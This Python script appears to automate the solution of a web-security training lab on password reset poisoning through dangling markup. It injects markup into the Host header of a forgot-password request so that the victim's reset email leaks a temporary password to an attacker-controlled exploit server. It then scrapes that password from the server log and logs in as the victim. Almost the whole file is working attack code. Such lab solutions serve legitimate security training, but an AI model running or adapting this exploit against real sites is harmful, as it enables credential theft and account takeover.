# Password reset poisoning via dangling markup

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to connect to the application as Wiener...')
	login_path = url + '/login'
	r = s.get(login_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		print('[+] Successfully connected as Wiener !')
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def send_forgot_req(s, url, attacker):
	print('\n[+] Trying to send a forgot password request for carlos...')
	forgot_path = url + '/forgot-password'
	parsed_atk = urllib.parse.urlparse(attacker)
	host = urllib.parse.urlparse(url).netloc
	email_path = attacker + '/email'
	log_path = attacker + '/log'
	r = s.get(forgot_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	session_cookie = s.cookies['session']
	lab_cookie = s.cookies['_lab']
	cookies = {'_lab': lab_cookie, 'session': session_cookie}
	forgot_data = {'username': 'carlos', 'csrf': csrf_token}
	forgot_host = f"""{host}:'<a href="//{parsed_atk.netloc}/?"""
	forgot_headers = {'Host': forgot_host}
	print(forgot_headers)
	r = s.post(forgot_path, data=forgot_data, headers=forgot_headers, cookies=cookies)
	time.sleep(5)
	print('\n[+] Trying to retrieve the output of the XSS Host Header in the exploit server logs...')
	r = s.get(log_path)
	password = re.findall(rb'click\+here&lt;/a&gt;\+to\+login\+with\+your\+new\+password:\+(.*)&lt;/p&gt;&lt;p&gt;', r.text.encode())[-1].decode()
	print(f'[+] Found Temporary password for Carlos account:\t{password}')
	return password

def connect_as_carlos(s, url, password):
	print('\n[+] Trying to connect to the application as Carlos...')
	login_path = url + '/login'
	r = s.get(login_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	time.sleep(1)
	data_login = {'username': 'carlos', 'password': password, 'csrf': csrf_token}
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: carlos' in r.text:
		print('[+] Successfully connected as Carlos !')
		return r
	else:
		print('[-] Exploit failed to connect as Carlos <!>')
		sys.exit(1)

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Go to exploit server", r.text):
		srv = re.search(r"href='(.*)'>Go to exploit server", r.text).group(1)
		print('[+] Found Exploit server:\n\t%s' % srv)
		return srv

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Password reset poisoning via dangling markup')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		exploit_srv = find_exploit_srv(r)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to take control of Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			r = s.get(url)
			parsed_atk = urllib.parse.urlparse(exploit_srv)
			if parsed_atk.netloc == b'':
				print('[-] Cannot find exploit server... Already solved <!>')
				sys.exit(1)
			attacker = parsed_atk.scheme + '://' + parsed_atk.netloc
			password = send_forgot_req(s, url, attacker)
			time.sleep(2)
			r = connect_as_carlos(s, url, password)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
